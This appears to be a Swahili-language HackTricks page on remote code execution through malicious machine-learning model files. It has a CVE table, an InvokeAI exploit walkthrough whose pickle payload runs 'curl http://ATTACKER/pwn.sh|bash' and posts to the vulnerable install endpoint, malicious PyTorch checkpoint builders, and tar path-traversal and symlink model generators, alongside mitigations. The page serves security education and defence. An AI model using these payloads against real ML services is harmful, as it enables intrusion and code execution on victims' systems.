# RCE za Modeli

{{#include ../banners/hacktricks-training.md}}

## Kupakia modeli kwa RCE

Modeli za Machine Learning kwa kawaida zinashirikiwa katika muundo tofauti, kama ONNX, TensorFlow, PyTorch, n.k. Modeli hizi zinaweza kupakiwa kwenye mashine za watengenezaji au mifumo ya uzalishaji ili kuzitumia. Kawaida modeli hazipaswi kuwa na code hasidi, lakini kuna baadhi ya kesi ambapo modeli inaweza kutumiwa kutekeleza code yoyote kwenye mfumo kama kipengele kilichokusudiwa au kwa sababu ya udhaifu katika maktaba ya kupakia modeli.

Wakati wa kuandika, hizi ni mifano ya aina hizi za udhaifu:

| **Mfumo / Zana**          | **Udhaifu (CVE endapo inapatikana)**                                                    | **Vector ya RCE**                                                                                                                           | **Marejeo**                               |
|-----------------------------|------------------------------------------------------------------------------------------------------------------------------|------------------------------------------------------------------------------------------------------------------------------------------|----------------------------------------------|
| **PyTorch** (Python)        | *Insecure deserialization in* `torch.load` **(CVE-2025-32434)**                                                              | pickle hasidi katika model checkpoint husababisha utekelezaji wa code (kupita `weights_only` safeguard)                                        | |
| PyTorch **TorchServe**      | *ShellTorch* – **CVE-2023-43654**, **CVE-2022-1471**                                                                         | SSRF + malicious model download causes code execution; Java deserialization RCE katika management API                                        | |
| **NVIDIA Merlin Transformers4Rec** | Unsafe checkpoint deserialization via `torch.load` **(CVE-2025-23298)**                                           | Untrusted checkpoint triggers pickle reducer during `load_model_trainer_states_from_checkpoint` → utekelezaji wa code katika ML worker            | [ZDI-25-833](https://www.zerodayinitiative.com/advisories/ZDI-25-833/) |
| **TensorFlow/Keras**        | **CVE-2021-37678** (unsafe YAML) <br> **CVE-2024-3660** (Keras Lambda)                                                      | Kupakia modeli kutoka YAML kunatumia `yaml.unsafe_load` (code exec) <br> Kupakia modeli yenye **Lambda** layer hufanya utekelezaji wa Python code yoyote          | |
| TensorFlow (TFLite)         | **CVE-2022-23559** (TFLite parsing)                                                                                          | Modeli `.tflite` iliyotengenezwa husababisha integer overflow → heap corruption (inawezekana RCE)                                                      | |
| **Scikit-learn** (Python)   | **CVE-2020-13092** (joblib/pickle)                                                                                           | Kupakia modeli kupitia `joblib.load` huitisha pickle na payload ya mshambuliaji `__reduce__`                                                   | |
| **NumPy** (Python)          | **CVE-2019-6446** (unsafe `np.load`) *disputed*                                                                              | chaguo-msingi cha `numpy.load` kinaruhusu pickled object arrays – `.npy/.npz` hasidi husababisha code exec                                            | |
| **ONNX / ONNX Runtime**     | **CVE-2022-25882** (dir traversal) <br> **CVE-2024-5187** (tar traversal)                                                    | ONNX model’s external-weights path can escape directory (read arbitrary files) <br> Malicious ONNX model tar can overwrite arbitrary files (leading to RCE) | |
| ONNX Runtime (design risk)  | *(No CVE)* ONNX custom ops / control flow                                                                                    | Model with custom operator requires loading attacker’s native code; complex model graphs abuse logic to execute unintended computations   | |
| **NVIDIA Triton Server**    | **CVE-2023-31036** (path traversal)                                                                                          | Kutumia model-load API na `--model-control` imewezeshwa kuruhusu relative path traversal kuandika faili (mfano: kuandika juu ya `.bashrc` kwa RCE)    | |
| **GGML (GGUF format)**      | **CVE-2024-25664 … 25668** (multiple heap overflows)                                                                         | Faili ya modeli ya GGUF iliyoharibika husababisha heap buffer overflows kwenye parser, ikiruhusu utekelezaji wa code yoyote kwenye mfumo wa mwathirika                     | |
| **Keras (older formats)**   | *(No new CVE)* Legacy Keras H5 model                                                                                         | Modeli HDF5 (`.h5`) hasidi yenye Lambda layer bado hufanya utekelezaji wa code wakati wa load (Keras safe_mode haijumuishi format za zamani – “downgrade attack”) | |
| **Others** (general)        | *Design flaw* – Pickle serialization                                                                                         | Zana nyingi za ML (mf., pickle-based model formats, Python `pickle.load`) zitaweka utekelezaji wa code yoyote uliowekwa katika faili za modeli isipokuwa zikadhibitiwe | |

Zaidi ya hayo, kuna baadhi ya modeli zinazotegemea python pickle kama zile zinazotumika na [PyTorch](https://github.com/pytorch/pytorch/security) ambazo zinaweza kutumiwa kutekeleza code yoyote kwenye mfumo ikiwa hazitapakuliwa kwa `weights_only=True`. Kwa hivyo, modeli yoyote inayotegemea pickle inaweza kuwa nyeti hasa kwa aina hii ya mashambulizi, hata kama hazijaorodheshwa katika jedwali hapo juu.

### 🆕  InvokeAI RCE via `torch.load` (CVE-2024-12029)

`InvokeAI` ni interface maarufu ya open-source ya wavuti kwa Stable-Diffusion. Matoleo **5.3.1 – 5.4.2** yanaonyesha endpoint ya REST `/api/v2/models/install` inayomruhusu mtumiaji kupakua na kupakia modeli kutoka kwenye URL yoyote.

Kimsingi endpoint hatimaye inaita:
```python
checkpoint = torch.load(path, map_location=torch.device("meta"))
```
Wakati faili iliyotolewa ni **PyTorch checkpoint (`*.ckpt`)**, `torch.load` hufanya **pickle deserialization**. Kwa sababu maudhui yanatoka moja kwa moja kutoka kwenye URL inayodhibitiwa na mtumiaji, mshambuliaji anaweza kuingiza kitu chenye madhara chenye method maalum `__reduce__` ndani ya checkpoint; method hiyo inatekelezwa **wakati wa deserialization**, ikisababisha **remote code execution (RCE)** kwenye InvokeAI server.

Udhaifu ulipewa **CVE-2024-12029** (CVSS 9.8, EPSS 61.17 %).

#### Exploitation walk-through

1. Tengeneza checkpoint yenye madhara:
```python
# payload_gen.py
import pickle, torch, os

class Payload:
def __reduce__(self):
return (os.system, ("/bin/bash -c 'curl http://ATTACKER/pwn.sh|bash'",))

with open("payload.ckpt", "wb") as f:
pickle.dump(Payload(), f)
```
2. Endesha `payload.ckpt` kwenye HTTP server unayoidhibiti (kwa mfano `http://ATTACKER/payload.ckpt`).
3. Chochea endpoint iliyo dhaifu (no authentication required):
```python
import requests

requests.post(
"http://TARGET:9090/api/v2/models/install",
params={
"source": "http://ATTACKER/payload.ckpt",  # remote model URL
"inplace": "true",                         # write inside models dir
# the dangerous default is scan=false → no AV scan
},
json={},                                         # body can be empty
timeout=5,
)
```
4. Wakati InvokeAI inapopakua faili inaita `torch.load()` → gadget ya `os.system` inaendeshwa na mshambuliaji anapata utekelezaji wa msimbo katika muktadha wa mchakato wa InvokeAI.

Exploit tayari: moduli ya **Metasploit** `exploit/linux/http/invokeai_rce_cve_2024_12029` inaoautomatisha mchakato mzima.

#### Masharti

•  InvokeAI 5.3.1-5.4.2 (scan flag default **false**)  
•  `/api/v2/models/install` inafikika kwa mshambuliaji  
•  Mchakato una ruhusa za kutekeleza amri za shell

#### Kupunguza Hatari

* Sasisha hadi **InvokeAI ≥ 5.4.3** – patch inaweka `scan=True` kwa chaguo-msingi na inafanya skanning ya malware kabla ya deserialization.  
* Unapopakua checkpoints programmatically tumia `torch.load(file, weights_only=True)` au helper mpya [`torch.load_safe`](https://pytorch.org/docs/stable/serialization.html#security).  
* Tekeleza allow-lists / signatures kwa vyanzo vya modeli na endesha huduma kwa least-privilege.

> ⚠️ Kumbuka kwamba **kila** muundo wa Python unaotegemea pickle (ikiwa ni pamoja na mafaili mengi `.pt`, `.pkl`, `.ckpt`, `.pth`) ni hatari kwa asili kufanyiwa deserialization kutoka kwa vyanzo visivyoaminika.

---

Mfano wa kupunguza hatari wa ad-hoc ikiwa lazima uendeleze matoleo ya zamani ya InvokeAI yanayofanya kazi nyuma ya reverse proxy:
```nginx
location /api/v2/models/install {
deny all;                       # block direct Internet access
allow 10.0.0.0/8;               # only internal CI network can call it
}
```
### 🆕 NVIDIA Merlin Transformers4Rec RCE kupitia isiyo salama `torch.load` (CVE-2025-23298)

Transformers4Rec ya NVIDIA (sehemu ya Merlin) ilifunua loader hatari ya checkpoint ambayo iliita moja kwa moja `torch.load()` kwa paths zilizotolewa na mtumiaji. Kwa sababu `torch.load` inategemea Python `pickle`, checkpoint inayodhibitiwa na mshambulizi inaweza kutekeleza msimbo wowote kupitia reducer wakati wa deserialization.

Njia iliyo na udhaifu (pre-fix): `transformers4rec/torch/trainer/trainer.py` → `load_model_trainer_states_from_checkpoint(...)` → `torch.load(...)`.

Kwa nini hili linapelekea RCE: Katika Python pickle, kitu kinaweza kutaja reducer (`__reduce__`/`__setstate__`) kinachorejesha callable na vigezo. Callable hiyo inatekelezwa wakati wa unpickling. Ikiwa kitu kama hicho kipo katika checkpoint, kinaendeshwa kabla uzito wowote kutumiwa.

Mfano mdogo wa checkpoint hasidi:
```python
import torch

class Evil:
def __reduce__(self):
import os
return (os.system, ("id > /tmp/pwned",))

# Place the object under a key guaranteed to be deserialized early
ckpt = {
"model_state_dict": Evil(),
"trainer_state": {"epoch": 10},
}

torch.save(ckpt, "malicious.ckpt")
```
Njia za utoaji na eneo la athari:
- Trojanized checkpoints/models zilizoshirikiwa kupitia repos, buckets, au artifact registries
- Automated resume/deploy pipelines zinazojipakia checkpoints moja kwa moja
- Uendeshaji hufanyika ndani ya training/inference workers, mara nyingi kwa vibali vya juu (mfano, root katika containers)

Suluhisho: Commit [b7eaea5](https://github.com/NVIDIA-Merlin/Transformers4Rec/pull/802/commits/b7eaea527d6ef46024f0a5086bce4670cc140903) (PR #802) ilibadilisha `torch.load()` ya moja kwa moja kwa deserializer iliyozuiliwa na iliyowekwa kwenye allow-list iliyotekelezwa katika `transformers4rec/utils/serialization.py`. Loader mpya inathibitisha types/fields na inazuia arbitrary callables kutiwa ndani wakati wa load.

Mwongozo wa kinga maalum kwa PyTorch checkpoints:
- Usifanye unpickle data isiyoaminika. Tumia zaidi fomati zisizotekelezwa kama [Safetensors](https://huggingface.co/docs/safetensors/index) au ONNX inapowezekana.
- Ikiwa lazima utumie PyTorch serialization, hakikisha `weights_only=True` (inayoungwa mkono katika PyTorch mpya) au tumia custom allow-listed unpickler sawa na patch ya Transformers4Rec.
- Lazimishe model provenance/signatures na sandbox deserialization (seccomp/AppArmor; non-root user; restricted FS na hakuna network egress).
- Angalia kwa ajili ya unexpected child processes kutoka huduma za ML wakati wa checkpoint load; fuatilia matumizi ya `torch.load()`/`pickle`.

POC na marejeo ya vulnerable/patch:
- Vulnerable pre-patch loader: https://gist.github.com/zdi-team/56ad05e8a153c84eb3d742e74400fd10.js
- Malicious checkpoint POC: https://gist.github.com/zdi-team/fde7771bb93ffdab43f15b1ebb85e84f.js
- Post-patch loader: https://gist.github.com/zdi-team/a0648812c52ab43a3ce1b3a090a0b091.js

## Mfano – kuunda model hatari ya PyTorch

- Tengeneza model:
```python
# attacker_payload.py
import torch
import os

class MaliciousPayload:
def __reduce__(self):
# This code will be executed when unpickled (e.g., on model.load_state_dict)
return (os.system, ("echo 'You have been hacked!' > /tmp/pwned.txt",))

# Create a fake model state dict with malicious content
malicious_state = {"fc.weight": MaliciousPayload()}

# Save the malicious state dict
torch.save(malicious_state, "malicious_state.pth")
```
- Pakia modeli:
```python
# victim_load.py
import torch
import torch.nn as nn

class MyModel(nn.Module):
def __init__(self):
super().__init__()
self.fc = nn.Linear(10, 1)

model = MyModel()

# ⚠️ This will trigger code execution from pickle inside the .pth file
model.load_state_dict(torch.load("malicious_state.pth", weights_only=False))

# /tmp/pwned.txt is created even if you get an error
```
## Models to Path Traversal

Kama ilivyotajwa katika [**this blog post**](https://blog.huntr.com/pivoting-archive-slip-bugs-into-high-value-ai/ml-bounties), muundo wa wengi wa models zinazotumiwa na frameworks mbalimbali za AI unategemea archives, kawaida `.zip`. Kwa hivyo, huenda iwezekane kuabuse format hizi ili kufanya path traversal attacks, na kuruhusu kusoma mafaili yoyote kutoka kwa mfumo ambapo model imepakuliwa.

Kwa mfano, kwa code ifuatayo unaweza kuunda model itakayounda faili katika directory ya `/tmp` wakati inapopakuliwa:
```python
import tarfile

def escape(member):
member.name = "../../tmp/hacked"     # break out of the extract dir
return member

with tarfile.open("traversal_demo.model", "w:gz") as tf:
tf.add("harmless.txt", filter=escape)
```
Au, kwa kutumia msimbo ufuatao unaweza kuunda model ambayo itaunda symlink kwa saraka ya `/tmp` wakati inapoanzishwa:
```python
import tarfile, pathlib

TARGET  = "/tmp"        # where the payload will land
PAYLOAD = "abc/hacked"

def link_it(member):
member.type, member.linkname = tarfile.SYMTYPE, TARGET
return member

with tarfile.open("symlink_demo.model", "w:gz") as tf:
tf.add(pathlib.Path(PAYLOAD).parent, filter=link_it)
tf.add(PAYLOAD)                      # rides the symlink
```
### Uchunguzi wa kina: Keras .keras deserialization and gadget hunting

Kwa mwongozo uliolengwa kuhusu ndani za .keras, Lambda-layer RCE, the arbitrary import issue in ≤ 3.8, na post-fix gadget discovery ndani ya allowlist, angalia:


{{#ref}}
../generic-methodologies-and-resources/python/keras-model-deserialization-rce-and-gadget-hunting.md
{{#endref}}

## Marejeo

- [OffSec blog – "CVE-2024-12029 – InvokeAI Deserialization of Untrusted Data"](https://www.offsec.com/blog/cve-2024-12029/)
- [InvokeAI patch commit 756008d](https://github.com/invoke-ai/invokeai/commit/756008dc5899081c5aa51e5bd8f24c1b3975a59e)
- [Rapid7 Metasploit module documentation](https://www.rapid7.com/db/modules/exploit/linux/http/invokeai_rce_cve_2024_12029/)
- [PyTorch – security considerations for torch.load](https://pytorch.org/docs/stable/notes/serialization.html#security)
- [ZDI blog – CVE-2025-23298 Getting Remote Code Execution in NVIDIA Merlin](https://www.thezdi.com/blog/2025/9/23/cve-2025-23298-getting-remote-code-execution-in-nvidia-merlin)
- [ZDI advisory: ZDI-25-833](https://www.zerodayinitiative.com/advisories/ZDI-25-833/)
- [Transformers4Rec patch commit b7eaea5 (PR #802)](https://github.com/NVIDIA-Merlin/Transformers4Rec/pull/802/commits/b7eaea527d6ef46024f0a5086bce4670cc140903)
- [Pre-patch vulnerable loader (gist)](https://gist.github.com/zdi-team/56ad05e8a153c84eb3d742e74400fd10.js)
- [Malicious checkpoint PoC (gist)](https://gist.github.com/zdi-team/fde7771bb93ffdab43f15b1ebb85e84f.js)
- [Post-patch loader (gist)](https://gist.github.com/zdi-team/a0648812c52ab43a3ce1b3a090a0b091.js)
- [Hugging Face Transformers](https://github.com/huggingface/transformers)

{{#include ../banners/hacktricks-training.md}}
